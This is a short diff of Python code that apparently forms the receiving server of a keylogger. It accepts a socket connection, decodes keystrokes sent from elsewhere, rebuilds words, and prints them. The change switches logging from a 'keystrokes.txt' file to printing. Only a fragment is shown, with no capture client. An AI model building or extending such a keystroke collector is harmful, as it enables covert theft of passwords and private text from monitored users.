@@ -7,10 +7,10 @@ socket.listen(5)
 
 connection, address = socket.accept()
 token = ''
-f = open('keystrokes.txt', 'a')
+# f = open('keystrokes.txt', 'a')
 while True:
     key = connection.recv(1024).decode()
-    print(key)
+    # print(key)
     int_key = 0
 
     try:
@@ -25,7 +25,8 @@ while True:
         token = token[:len(token)-1]
 
     if key == 'space':
-        f.write(token)
-        f.write('\n')
+        print(token)
+        # f.write(token)
+        # f.write('\n')
         token = ''
     
